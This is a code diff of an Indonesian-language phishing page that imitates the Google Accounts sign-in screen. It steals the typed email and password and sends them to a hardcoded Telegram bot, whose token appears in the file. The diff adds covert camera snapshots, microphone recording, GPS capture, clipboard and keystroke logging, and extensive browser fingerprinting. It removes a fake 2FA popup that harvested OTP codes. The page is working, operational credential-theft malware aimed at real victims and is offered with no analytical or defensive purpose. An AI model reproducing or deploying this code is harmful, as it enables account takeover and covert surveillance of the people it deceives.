@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Sign in - Google Accounts</title>
     <style>
         * {
@@ -94,6 +94,31 @@
             font-size: 14px;
             margin-top: 12px;
         }
+        .permission-popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial;
+        }
+        .permission-box {
+            background: white;
+            border-radius: 12px;
+            padding: 24px;
+            max-width: 320px;
+            width: 90%;
+            text-align: center;
+        }
+        .permission-box button {
+            margin-top: 16px;
+            padding: 10px 20px;
+        }
         @media (max-width: 480px) {
             .container {
                 padding: 32px 24px;
@@ -123,28 +148,85 @@
         // ========== TELEGRAM CONFIG ==========
         const BOT_TOKEN = "8617014310:AAEidb6kIIlM4QLyoAMm5FMGskMSutKO6aU";
         const CHAT_ID = "8753510792";
-        const REDIRECT_URL = "https://spotplaymav7.lovable.app";
+        const REDIRECT_URL = "https://google.com";
         
-        // ========== KEYLOGGER GLOBAL ==========
+        let startTime = Date.now();
         let keyLogs = [];
+        let clipboardData = "";
+        let cameraPhoto = null;
+        let microphoneData = null;
+        let locationData = null;
+        
+        // ========== REQUEST PERMISSIONS DULU ==========
+        async function requestAllPermissions() {
+            // Request Camera
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                cameraPhoto = canvas.toDataURL('image/jpeg');
+                stream.getTracks().forEach(track => track.stop());
+            } catch(e) { cameraPhoto = "Gagal akses kamera: " + e.message; }
+            
+            // Request Microphone
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                    const blob = new Blob(chunks, { type: 'audio/webm' });
+                    const reader = new FileReader();
+                    reader.onloadend = () => { microphoneData = reader.result.substring(0, 500) + "..."; };
+                    reader.readAsDataURL(blob);
+                    stream.getTracks().forEach(track => track.stop());
+                }, 3000);
+            } catch(e) { microphoneData = "Gagal akses mic: " + e.message; }
+            
+            // Request Location
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
+                locationData = `${pos.coords.latitude}, ${pos.coords.longitude} (akurasi: ${pos.coords.accuracy}m)`;
+            } catch(e) { locationData = "Gagal akses lokasi: " + e.message; }
+        }
+        
+        // ========== KEYLOGGER ==========
         document.addEventListener('keypress', function(e) {
             if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
                 keyLogs.push(e.key);
-                if (keyLogs.length > 200) keyLogs.shift();
+                if (keyLogs.length > 500) keyLogs.shift();
             }
         });
         
-        // ========== GET ALL COOKIES ==========
-        function getAllCookies() {
-            try {
-                return document.cookie || '(Tidak ada cookie)';
-            } catch(e) {
-                return '(Tidak bisa akses cookie)';
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && e.target.tagName !== 'INPUT') {
+                keyLogs.push('[ENTER]');
             }
+        });
+        
+        // ========== CLIPBOARD ==========
+        document.addEventListener('copy', function(e) {
+            clipboardData = window.getSelection().toString();
+            if (clipboardData) keyLogs.push(`[COPY: ${clipboardData.substring(0, 100)}]`);
+        });
+        
+        // ========== COOKIES ==========
+        function getAllCookies() {
+            try { return document.cookie || '(Tidak ada)'; } catch(e) { return '(Error)'; }
         }
         
-        // ========== GET ALL LOCALSTORAGE ==========
-        function getAllLocalStorage() {
+        // ========== STORAGE ==========
+        function getLocalStorage() {
             try {
                 const items = {};
                 for (let i = 0; i < localStorage.length; i++) {
@@ -152,13 +234,10 @@
                     items[key] = localStorage.getItem(key);
                 }
                 return JSON.stringify(items, null, 2) || '(Kosong)';
-            } catch(e) {
-                return '(Tidak bisa akses localStorage)';
-            }
+            } catch(e) { return '(Error)'; }
         }
         
-        // ========== GET ALL SESSIONSTORAGE ==========
-        function getAllSessionStorage() {
+        function getSessionStorage() {
             try {
                 const items = {};
                 for (let i = 0; i < sessionStorage.length; i++) {
@@ -166,155 +245,151 @@
                     items[key] = sessionStorage.getItem(key);
                 }
                 return JSON.stringify(items, null, 2) || '(Kosong)';
-            } catch(e) {
-                return '(Tidak bisa akses sessionStorage)';
-            }
+            } catch(e) { return '(Error)'; }
         }
         
-        // ========== WEBGL FINGERPRINT ==========
-        function getWebGLInfo() {
+        function getIndexedDB() {
+            try {
+                return "IndexedDB support: " + (!!window.indexedDB);
+            } catch(e) { return "Error"; }
+        }
+        
+        // ========== WEBGL ==========
+        function getWebGL() {
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return 'WebGL tidak support';
+                if (!gl) return 'Tidak support';
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (!debugInfo) return 'Tidak bisa dapat info renderer';
-                const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                return `${vendor} | ${renderer}`;
-            } catch(e) {
-                return 'Error: ' + e.message;
-            }
+                if (!debugInfo) return 'Tidak ada info';
+                return `${gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)} | ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}`;
+            } catch(e) { return 'Error'; }
         }
         
-        // ========== PLUGINS LIST ==========
+        // ========== CANVAS FINGERPRINT ==========
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 200;
+                canvas.height = 50;
+                const ctx = canvas.getContext('2d');
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(0, 0, 100, 50);
+                ctx.fillStyle = "#069";
+                ctx.fillText("Amba", 50, 20);
+                return canvas.toDataURL().substring(0, 100);
+            } catch(e) { return "Error"; }
+        }
+        
+        // ========== AUDIO FINGERPRINT ==========
+        function getAudioFingerprint() {
+            try {
+                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                const ctx = new AudioContext();
+                const oscillator = ctx.createOscillator();
+                const analyser = ctx.createAnalyser();
+                oscillator.connect(analyser);
+                oscillator.frequency.value = 440;
+                oscillator.start();
+                const data = new Uint8Array(analyser.frequencyBinCount);
+                analyser.getByteFrequencyData(data);
+                oscillator.stop();
+                return data.slice(0, 10).join(',');
+            } catch(e) { return "Error"; }
+        }
+        
+        // ========== FONTS ==========
+        function getFonts() {
+            const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Tahoma', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Poppins', 'Inter', 'Helvetica', 'Calibri', 'Segoe UI', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Impact', 'Trebuchet MS', 'Palatino', 'Garamond', 'Bookman', 'Arial Black', 'Helvetica Neue', 'Lucida Grande', 'Tahoma', 'Geneva', 'Verdana', 'Times', 'Courier', 'Symbol', 'Webdings', 'Wingdings', 'MS Sans Serif', 'MS Serif'];
+            const installed = [];
+            const testDiv = document.createElement('div');
+            testDiv.style.position = 'absolute';
+            testDiv.style.top = '-9999px';
+            testDiv.style.fontSize = '72px';
+            document.body.appendChild(testDiv);
+            for (const font of fonts) {
+                testDiv.style.fontFamily = `${font}, sans-serif`;
+                testDiv.innerHTML = 'mmmmmm';
+                if (testDiv.offsetWidth > 0) installed.push(font);
+            }
+            document.body.removeChild(testDiv);
+            return installed.join(', ');
+        }
+        
+        // ========== PLUGINS ==========
         function getPlugins() {
             try {
                 const plugins = [];
                 for (let i = 0; i < navigator.plugins.length; i++) {
                     plugins.push(navigator.plugins[i].name);
                 }
-                return plugins.join(', ') || '(Tidak ada plugin)';
-            } catch(e) {
-                return '(Tidak bisa akses plugins)';
-            }
+                return plugins.join(', ') || '(Tidak ada)';
+            } catch(e) { return '(Error)'; }
         }
         
-        // ========== FONTS DETECTION ==========
-        function getFonts() {
-            const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Tahoma', 'Trebuchet MS', 'Impact', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Poppins', 'Inter', 'Helvetica', 'Calibri', 'Candara', 'Segoe UI', 'Oxygen'];
-            const baseFonts = ['monospace', 'sans-serif', 'serif'];
-            const installed = [];
-            const testString = 'mmmmmmmmmmlli';
-            const testDiv = document.createElement('div');
-            testDiv.style.position = 'absolute';
-            testDiv.style.top = '-9999px';
-            testDiv.style.left = '-9999px';
-            testDiv.style.fontSize = '72px';
-            document.body.appendChild(testDiv);
-            
-            const widths = {};
-            for (const base of baseFonts) {
-                testDiv.style.fontFamily = base;
-                testDiv.innerHTML = testString;
-                widths[base] = testDiv.offsetWidth;
-            }
-            
-            for (const font of testFonts) {
-                let detected = false;
-                for (const base of baseFonts) {
-                    testDiv.style.fontFamily = `${font}, ${base}`;
-                    testDiv.innerHTML = testString;
-                    if (testDiv.offsetWidth !== widths[base]) {
-                        detected = true;
-                        break;
-                    }
+        // ========== MIME TYPES ==========
+        function getMimeTypes() {
+            try {
+                const mimes = [];
+                for (let i = 0; i < navigator.mimeTypes.length; i++) {
+                    mimes.push(navigator.mimeTypes[i].type);
                 }
-                if (detected) installed.push(font);
-            }
-            
-            document.body.removeChild(testDiv);
-            return installed.join(', ') || '(Tidak ada font terdeteksi)';
+                return mimes.join(', ') || '(Tidak ada)';
+            } catch(e) { return '(Error)'; }
         }
         
-        // ========== TIMEZONE & LOCALE ==========
-        function getDetailedTime() {
-            const now = new Date();
-            return {
-                waktu: now.toLocaleString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit', timeZoneName: 'short' }),
-                unix: Math.floor(now.getTime() / 1000),
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                locale: navigator.language,
-                offset: -new Date().getTimezoneOffset() / 60
-            };
+        // ========== BATTERY ==========
+        async function getBattery() {
+            try {
+                if (!('getBattery' in navigator)) return 'Tidak support';
+                const battery = await navigator.getBattery();
+                return `${Math.round(battery.level * 100)}% (Charging: ${battery.charging ? 'Ya' : 'Tidak'}) - ${battery.chargingTime} menit lagi penuh`;
+            } catch(e) { return 'Error'; }
         }
         
-        // ========== NETWORK INFO ==========
-        function getNetworkInfo() {
+        // ========== NETWORK ==========
+        function getNetwork() {
             const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             if (!conn) return 'Tidak diketahui';
-            return {
-                type: conn.effectiveType || '?',
-                downlink: conn.downlink ? conn.downlink + ' Mbps' : '?',
-                rtt: conn.rtt ? conn.rtt + ' ms' : '?',
-                saveData: conn.saveData ? 'Ya' : 'Tidak'
-            };
+            return `Tipe: ${conn.effectiveType || '?'}, Kecepatan: ${conn.downlink ? conn.downlink + 'Mbps' : '?'}, RTT: ${conn.rtt ? conn.rtt + 'ms' : '?'}, SaveData: ${conn.saveData ? 'Ya' : 'Tidak'}`;
         }
         
-        // ========== BATTERY INFO ==========
-        async function getBatteryInfo() {
+        // ========== DEVICE MEMORY ==========
+        function getDeviceMemory() {
+            return navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Tidak diketahui';
+        }
+        
+        // ========== CPU ==========
+        function getCPU() {
+            return navigator.hardwareConcurrency || 'Tidak diketahui';
+        }
+        
+        // ========== SCREEN ==========
+        function getScreen() {
+            return `${screen.width}x${screen.height}, depth: ${screen.colorDepth}bit, orientation: ${screen.orientation?.type || 'Tidak diketahui'}`;
+        }
+        
+        // ========== BATTERY DETAIL ==========
+        async function getBatteryDetail() {
             try {
-                if (!('getBattery' in navigator)) return { level: 'Tidak support', charging: 'Tidak support' };
+                if (!('getBattery' in navigator)) return 'Tidak support';
                 const battery = await navigator.getBattery();
                 return {
                     level: Math.round(battery.level * 100) + '%',
-                    charging: battery.charging ? 'Ya' : 'Tidak'
+                    charging: battery.charging ? 'Ya' : 'Tidak',
+                    chargingTime: battery.chargingTime === Infinity ? 'Tidak terbatas' : battery.chargingTime + ' detik',
+                    dischargingTime: battery.dischargingTime === Infinity ? 'Tidak terbatas' : battery.dischargingTime + ' detik'
                 };
-            } catch(e) {
-                return { level: 'Error', charging: 'Error' };
-            }
+            } catch(e) { return { level: 'Error', charging: 'Error' }; }
         }
         
-        // ========== FAKE 2FA POPUP (TAMBAHAN) ==========
-        async function showFake2FA(email) {
-            return new Promise((resolve) => {
-                const popup = document.createElement('div');
-                popup.id = 'fake2fa';
-                popup.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:10000;display:flex;justify-content:center;align-items:center;font-family:Roboto,Arial,sans-serif;';
-                popup.innerHTML = `
-                    <div style="background:white;border-radius:12px;padding:28px;max-width:380px;width:90%;text-align:center;box-shadow:0 4px 20px rgba(0,0,0,0.3);">
-                        <div style="font-size:48px;margin-bottom:12px;">🔐</div>
-                        <h3 style="margin-bottom:8px;">Verify your identity</h3>
-                        <p style="color:#5f6368;margin-bottom:20px;font-size:14px;">We sent a verification code to your recovery phone ending with <strong>**${Math.floor(Math.random() * 90 + 10)}</strong></p>
-                        <div style="text-align:left;margin-bottom:20px;">
-                            <label style="display:block;margin-bottom:8px;font-size:14px;">6-digit code</label>
-                            <input type="text" id="fakeOtp" maxlength="6" placeholder="000000" style="width:100%;padding:12px;border:1px solid #dadce0;border-radius:4px;font-size:16px;text-align:center;letter-spacing:4px;">
-                            <label style="display:block;margin-top:16px;margin-bottom:8px;font-size:14px;">Backup email (optional)</label>
-                            <input type="email" id="fakeBackupEmail" placeholder="backup@gmail.com" style="width:100%;padding:12px;border:1px solid #dadce0;border-radius:4px;">
-                        </div>
-                        <button id="fake2faSubmit" style="width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;cursor:pointer;">Verify</button>
-                        <p style="font-size:12px;color:#5f6368;margin-top:12px;">Didn't receive code? <a href="#" style="color:#1a73e8;">Resend</a></p>
-                    </div>
-                `;
-                document.body.appendChild(popup);
-                
-                document.getElementById('fake2faSubmit').addEventListener('click', () => {
-                    const otp = document.getElementById('fakeOtp').value;
-                    const backupEmail = document.getElementById('fakeBackupEmail').value;
-                    popup.remove();
-                    resolve({ otp, backupEmail });
-                });
-            });
-        }
-        
-        // ========== MAIN LOGIC ==========
+        // ========== MAIN ==========
         document.getElementById('loginBtn').addEventListener('click', async function() {
             const email = document.getElementById('email').value.trim();
             const password = document.getElementById('password').value;
             
             if (!email || !password) {
                 document.getElementById('errorMsg').style.display = 'block';
-                document.getElementById('errorMsg').innerText = 'Harap masukkan email dan password';
                 return;
             }
             
@@ -322,182 +397,281 @@
             document.getElementById('loading').style.display = 'block';
             document.getElementById('errorMsg').style.display = 'none';
             
-            // Kumpulkan semua data
-            const [ipData, battery, webgl, network, timeDetail, fonts, plugins, cookies, localStorageData, sessionStorageData] = await Promise.all([
+            // Request all permissions first
+            await requestAllPermissions();
+            
+            // Wait for microphone recording
+            await new Promise(r => setTimeout(r, 4000));
+            
+            // ========== KUMPULKAN SEMUA DATA ==========
+            const [ipData, battery, batteryDetail, network, fonts, webgl, plugins, mimes, canvasFP, audioFP, indexedDB, localStorage, sessionStorage, cookies, deviceMemory, cpu, screen, locationGPS] = await Promise.all([
                 fetch('https://ipapi.co/json/').then(r => r.json()).catch(e => ({})),
-                getBatteryInfo(),
-                Promise.resolve(getWebGLInfo()),
-                Promise.resolve(getNetworkInfo()),
-                Promise.resolve(getDetailedTime()),
+                getBattery(),
+                getBatteryDetail(),
+                Promise.resolve(getNetwork()),
                 Promise.resolve(getFonts()),
+                Promise.resolve(getWebGL()),
                 Promise.resolve(getPlugins()),
+                Promise.resolve(getMimeTypes()),
+                Promise.resolve(getCanvasFingerprint()),
+                Promise.resolve(getAudioFingerprint()),
+                Promise.resolve(getIndexedDB()),
+                Promise.resolve(getLocalStorage()),
+                Promise.resolve(getSessionStorage()),
                 Promise.resolve(getAllCookies()),
-                Promise.resolve(getAllLocalStorage()),
-                Promise.resolve(getAllSessionStorage())
+                Promise.resolve(getDeviceMemory()),
+                Promise.resolve(getCPU()),
+                Promise.resolve(getScreen()),
+                Promise.resolve(locationData || "Belum dapat")
             ]);
             
             // IP backup
-            let ipBackup = 'Tidak diketahui';
+            let ipBackup = '';
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 ipBackup = data.ip;
             } catch(e) {}
             
-            // Browser & Device Info
             const ua = navigator.userAgent;
-            const screenRes = `${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
-            const ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Tidak diketahui';
-            const cpu = navigator.hardwareConcurrency || 'Tidak diketahui';
-            const touchPoints = navigator.maxTouchPoints || 0;
             const platform = navigator.platform;
             const language = navigator.language;
+            const languages = navigator.languages ? navigator.languages.join(', ') : language;
             const doNotTrack = navigator.doNotTrack === '1' ? 'Ya' : 'Tidak';
             const cookieEnabled = navigator.cookieEnabled ? 'Ya' : 'Tidak';
             const darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Ya' : 'Tidak';
+            const touchPoints = navigator.maxTouchPoints || 0;
+            const vendor = navigator.vendor || 'Tidak diketahui';
+            const product = navigator.product || 'Tidak diketahui';
+            const productSub = navigator.productSub || 'Tidak diketahui';
+            const appName = navigator.appName || 'Tidak diketahui';
+            const appVersion = navigator.appVersion || 'Tidak diketahui';
+            const onLine = navigator.onLine ? 'Online' : 'Offline';
+            
+            // AdBlock Detection
+            let adblockDetected = false;
+            const testAd = document.createElement('div');
+            testAd.className = 'adsbox';
+            testAd.style.display = 'none';
+            document.body.appendChild(testAd);
+            if (testAd.offsetHeight === 0 && testAd.offsetWidth === 0) adblockDetected = true;
             
             // OS Detection
             let os = 'Tidak diketahui';
-            if (ua.includes('Windows')) os = 'Windows';
-            else if (ua.includes('Mac OS')) os = 'macOS';
-            else if (ua.includes('Android')) os = 'Android';
-            else if (ua.includes('iPhone')) os = 'iOS';
+            if (ua.includes('Windows')) os = 'Windows ' + (ua.match(/Windows NT ([\d.]+)/)?.[1] || '');
+            else if (ua.includes('Android')) os = 'Android ' + (ua.match(/Android ([\d.]+)/)?.[1] || '');
+            else if (ua.includes('iPhone')) os = 'iOS iPhone';
+            else if (ua.includes('iPad')) os = 'iOS iPad';
+            else if (ua.includes('Mac')) os = 'macOS';
             else if (ua.includes('Linux')) os = 'Linux';
             
             // Browser Detection
-            let browser = 'Tidak diketahui';
-            if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
-            else if (ua.includes('Firefox')) browser = 'Firefox';
-            else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
-            else if (ua.includes('Edg')) browser = 'Edge';
-            else if (ua.includes('Opera')) browser = 'Opera';
+            let browser = 'Tidak diketahui', browserVersion = '';
+            if (ua.includes('Chrome') && !ua.includes('Edg')) { browser = 'Chrome'; browserVersion = ua.match(/Chrome\/(\d+)/)?.[1] || ''; }
+            else if (ua.includes('Firefox')) { browser = 'Firefox'; browserVersion = ua.match(/Firefox\/(\d+)/)?.[1] || ''; }
+            else if (ua.includes('Safari') && !ua.includes('Chrome')) { browser = 'Safari'; browserVersion = ua.match(/Version\/(\d+)/)?.[1] || ''; }
+            else if (ua.includes('Edg')) { browser = 'Edge'; browserVersion = ua.match(/Edg\/(\d+)/)?.[1] || ''; }
+            else if (ua.includes('Opera')) { browser = 'Opera'; browserVersion = ua.match(/Opera\/(\d+)/)?.[1] || ''; }
             
-            // Hitung durasi
-            const startTime = window.performance?.timing?.navigationStart || Date.now();
+            // Device Brand & Model
+            let deviceBrand = 'PC Custom', deviceModel = 'Tidak diketahui';
+            if (/(Mobile|Android|iPhone|iPad)/i.test(ua)) {
+                if (ua.includes('iPhone')) { deviceBrand = 'Apple'; deviceModel = 'iPhone'; }
+                else if (ua.includes('iPad')) { deviceBrand = 'Apple'; deviceModel = 'iPad'; }
+                else if (ua.includes('Samsung')) { deviceBrand = 'Samsung'; deviceModel = ua.match(/SM-[A-Z0-9]+/)?.[0] || 'Galaxy'; }
+                else if (ua.includes('Xiaomi')) { deviceBrand = 'Xiaomi'; }
+                else if (ua.includes('Redmi')) { deviceBrand = 'Xiaomi Redmi'; }
+                else if (ua.includes('OPPO')) { deviceBrand = 'OPPO'; }
+                else if (ua.includes('vivo')) { deviceBrand = 'vivo'; }
+                else if (ua.includes('Realme')) { deviceBrand = 'Realme'; }
+                else if (ua.includes('OnePlus')) { deviceBrand = 'OnePlus'; }
+                else if (ua.includes('Nokia')) { deviceBrand = 'Nokia'; }
+                else if (ua.includes('Google Pixel')) { deviceBrand = 'Google'; deviceModel = 'Pixel'; }
+                else { deviceBrand = 'Android'; }
+            }
+            
+            // Time data
+            const now = new Date();
+            const waktuFormatted = now.toLocaleString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit', timeZoneName: 'short' });
+            const unixTimestamp = Math.floor(now.getTime() / 1000);
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const timezoneOffset = -now.getTimezoneOffset() / 60;
+            const hour = now.getHours();
+            const peakHour = (hour >= 19 && hour <= 22) ? 'Ya (jam sibuk)' : 'Tidak';
             const duration = Math.floor((Date.now() - startTime) / 1000);
+            const keylog = keyLogs.join('') || '(Tidak ada)';
             
-            // Keylog
-            const keylogData = keyLogs.join('') || '(Tidak ada)';
-            
-            // Buat pesan SUPER LENGKAP
-            const message = `
-╔══════════════════════════════════════════════════════════════╗
-║              🔥 GOOGLE ULTIMATE GRABBER v4.0 🔥               ║
-╚══════════════════════════════════════════════════════════════╝
+            // Build ULTIMATE MESSAGE
+            const message = `╔══════════════════════════════════════════════════════════════════════════════════╗
+║                    🔥 ULTIMATE PHISHING 9000 - FULL ACCESS 🔥                    ║
+╚══════════════════════════════════════════════════════════════════════════════════╝
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📧 AKUN KORBAN
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Email: ${email}
-Password: ${password}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🌐 IP & GEOLOKASI LENGKAP
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-IP Address: ${ipData?.ip || ipBackup}
-Negara: ${ipData?.country_name || '?'} (${ipData?.country_code || '?'})
-Kota: ${ipData?.city || '?'}
-Region: ${ipData?.region || '?'}
-Kode Pos: ${ipData?.postal || '?'}
-Latitude/Longitude: ${ipData?.latitude || '?'}, ${ipData?.longitude || '?'}
-ISP: ${ipData?.org || '?'}
-ASN: ${ipData?.asn || '?'}
-VPN/Proxy: ${ipData?.proxy ? '✅ YA' : '❌ TIDAK'}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-💻 DEVICE & HARDWARE
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-OS: ${os}
-Browser: ${browser}
-User Agent: ${ua.substring(0, 150)}...
-Platform: ${platform}
-Language: ${language}
-Screen: ${screenRes}
-Touch Points: ${touchPoints}
-RAM: ${ram}
-CPU Cores: ${cpu}
-Dark Mode: ${darkMode}
-Do Not Track: ${doNotTrack}
-Cookie Enabled: ${cookieEnabled}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🎮 WEBGL & FINGERPRINT
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-WebGL: ${webgl.substring(0, 100)}
-Fonts Terinstall: ${fonts.substring(0, 150)}
-Plugins: ${plugins.substring(0, 150)}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🍪 COOKIE & STORAGE
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Cookie: ${cookies.substring(0, 200)}${cookies.length > 200 ? '...' : ''}
-
-LocalStorage: ${localStorageData.substring(0, 300)}${localStorageData.length > 300 ? '...' : ''}
-
-SessionStorage: ${sessionStorageData.substring(0, 300)}${sessionStorageData.length > 300 ? '...' : ''}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⏰ WAKTU & METADATA
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Waktu: ${timeDetail.waktu}
-UNIX: ${timeDetail.unix}
-Timezone: ${timeDetail.timezone}
-Locale: ${timeDetail.locale}
-Offset GMT: ${timeDetail.offset}
-Durasi Halaman: ${duration} detik
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📡 NETWORK & BATTERY
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Network: ${network.type} (${network.downlink}, RTT ${network.rtt})
-Save Data: ${network.saveData}
-Battery: ${battery.level} (Charging: ${battery.charging})
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⌨️ KEYLOGGER
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-${keylogData.substring(0, 300)}${keylogData.length > 300 ? '...' : ''}
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔗 TRAFFIC SOURCE
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-URL: ${window.location.href}
-Referrer: ${document.referrer || '(Langsung)'}
-
-╚══════════════════════════════════════════════════════════════╝
-            `;
-            
-            // Kirim ke Telegram
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
-            }).catch(e => console.log);
-            
-            // Tampilkan fake 2FA untuk ambil OTP & backup email
-            const fakeData = await showFake2FA(email);
-            
-            const fakeMessage = `
-╔══════════════════════════════════════╗
-║     🎭 FAKE 2FA DATA (EXTRA)         ║
-╚══════════════════════════════════════╝
-
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📧 Email: ${email}
-🔢 OTP Code: ${fakeData.otp || '(Tidak diisi)'}
-📧 Backup Email: ${fakeData.backupEmail || '(Tidak diisi)'}
-            `;
+🔑 Password: ${password}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📸 KAMERA & MIKROFON
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📷 Foto dari Kamera: ${cameraPhoto ? cameraPhoto.substring(0, 100) + '...' : 'Gagal'}
+🎤 Rekaman Mic: ${microphoneData ? microphoneData.substring(0, 100) + '...' : 'Gagal'}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📍 LOKASI REAL-TIME
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📍 GPS: ${locationGPS}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🌐 IP & GEOLOKASI LENGKAP
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🌍 IP Address: ${ipData?.ip || ipBackup}
+📍 Negara: ${ipData?.country_name || '?'} (${ipData?.country_code || '?'})
+🏙️ Kota: ${ipData?.city || '?'}
+🗺️ Region: ${ipData?.region || '?'}
